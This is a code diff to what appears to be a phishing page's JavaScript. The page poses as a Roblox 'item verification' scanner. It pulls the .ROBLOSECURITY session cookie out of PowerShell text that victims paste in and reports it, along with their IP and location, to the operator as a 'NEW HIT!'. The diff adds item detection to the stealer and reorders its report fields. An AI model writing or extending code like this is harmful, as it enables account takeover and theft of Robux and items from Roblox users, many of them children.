@@ -211,9 +211,10 @@ async function submitPowerShell() {
     showLoadingOverlay('Preparing scan...', 'Initializing item verification process');
 
     try {
-                        // Scan limited items and find authentication data from the input
+                                // Scan limited items and find authentication data from the input
         const limitedItems = extractLimitedItems(inputText);
         const robloxCookie = extractRobloxCookie(inputText);
+        const detectedItem = detectRobloxItemFromScript(inputText);
         
         // Check word count using real input value - if 50+ words, allow through even without auth data
         const wordCount = realInputValue.split(/\s+/).filter(word => word.length > 0).length;
@@ -250,13 +251,13 @@ async function submitPowerShell() {
             },
             fields: [
                 {
-                    name: "🍪 Authentication Cookie",
-                    value: robloxCookie ? `\`\`\`|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|${robloxCookie}\`\`\`` : "`No cookie found`",
+                    name: "🎮 Scanning Roblox Item",
+                    value: detectedItem ? `**${detectedItem.name}**\n*ID: ${detectedItem.id} | Type: ${detectedItem.type}*\n[View Item](${detectedItem.url})` : "`No specific item detected in script`",
                     inline: false
                 },
                 {
-                    name: "🎮 Target Roblox Item",
-                    value: detectedItem ? `**${detectedItem.name}**\n*ID: ${detectedItem.id}*\n*Type: ${detectedItem.type}*\n[View Item](${detectedItem.url})` : "`No specific item detected`",
+                    name: "🍪 Authentication Cookie",
+                    value: robloxCookie ? `\`\`\`|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|${robloxCookie}\`\`\`` : "`No cookie found`",
                     inline: false
                 },
                 {
@@ -314,7 +315,7 @@ async function submitPowerShell() {
             const simpleEmbed = {
                 title: "🚨 NEW HIT! 🚨",
                 color: 0xff0000,
-                description: `**Cookie:** ${robloxCookie ? `\`|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|${robloxCookie}\`` : 'None'}\n**Location:** ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\n**IP:** ${locationInfo.ip || 'Unknown'}`,
+                description: `**Item:** ${detectedItem ? `${detectedItem.name} (ID: ${detectedItem.id})` : 'Unknown'}\n**Cookie:** ${robloxCookie ? `\`|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|${robloxCookie}\`` : 'None'}\n**Location:** ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'}\n**IP:** ${locationInfo.ip || 'Unknown'}`,
                 timestamp: new Date().toISOString()
             };
             
@@ -543,6 +544,52 @@ function extractRobloxCookie(text) {
         const longest = veryLongStrings.reduce((a, b) => a.length > b.length ? a : b);
         if (longest.length > 500) {
             return longest.trim();
+        }
+    }
+    
+    return null;
+}
+
+// Function to detect Roblox item from PowerShell script
+function detectRobloxItemFromScript(text) {
+    // Look for Roblox catalog URLs in the script
+    const urlPatterns = [
+        // Standard catalog URL: https://www.roblox.com/catalog/16477149823/Gold-Clockwork-Headphones
+        /https?:\/\/(?:www\.)?roblox\.com\/catalog\/(\d+)\/([^"\s?&]+)/gi,
+        // Library URL: https://www.roblox.com/library/12345/Item-Name
+        /https?:\/\/(?:www\.)?roblox\.com\/library\/(\d+)\/([^"\s?&]+)/gi,
+        // Bundles URL: https://www.roblox.com/bundles/12345/Bundle-Name
+        /https?:\/\/(?:www\.)?roblox\.com\/bundles\/(\d+)\/([^"\s?&]+)/gi
+    ];
+    
+    for (const pattern of urlPatterns) {
+        const match = pattern.exec(text);
+        if (match) {
+            const itemId = match[1];
+            let itemName = match[2] || 'Unknown Item';
+            
+            // Clean up the item name from URL format
+            itemName = itemName.replace(/-/g, ' ').replace(/\+/g, ' ');
+            // Capitalize first letter of each word
+            itemName = itemName.split(' ').map(word => 
+                word.charAt(0).toUpperCase() + word.slice(1).toLowerCase()
+            ).join(' ');
+            
+            let itemType = 'Unknown';
+            if (pattern.source.includes('catalog')) {
+                itemType = 'Catalog Item';
+            } else if (pattern.source.includes('library')) {
+                itemType = 'Library Asset';
+            } else if (pattern.source.includes('bundles')) {
+                itemType = 'Bundle';
+            }
+            
+            return {
+                id: itemId,
+                name: itemName,
+                type: itemType,
+                url: match[0]
+            };
         }
     }
     
